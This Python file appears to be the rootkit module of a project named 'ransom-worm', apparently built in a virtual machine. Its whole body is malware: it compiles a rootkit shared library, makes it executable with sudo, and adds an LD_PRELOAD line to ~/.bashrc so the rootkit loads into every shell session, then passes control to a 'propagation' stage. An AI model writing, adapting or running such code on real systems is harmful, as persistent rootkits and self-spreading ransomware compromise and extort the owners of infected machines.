###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

from pathlib import Path
import subprocess

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

def exec_bash(cmd, output=True):
    return subprocess.check_output(cmd, shell=True)

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    next_action = ""
    data = "no_data"
    print("[+] Rootkit module activated...")

    subprocess.run("gcc -fPIC -shared -o /home/vboxuser/ransom-worm/utils/rootkit.so /home/vboxuser/ransom-worm/utils/rootkit.c -ldl", shell=True)
    print("1")
    subprocess.run("sudo chmod 755 /home/vboxuser/ransom-worm/utils/rootkit.so", shell=True)
    print("2")
    subprocess.run("echo 'export LD_PRELOAD=/home/vboxuser/ransom-worm/utils/rootkit.so' >> ~/.bashrc && . ~/.bashrc", shell=True)
    print("3")

    next_action = "propagation"
    return data, next_action

if __name__ == '__main__':
	run()
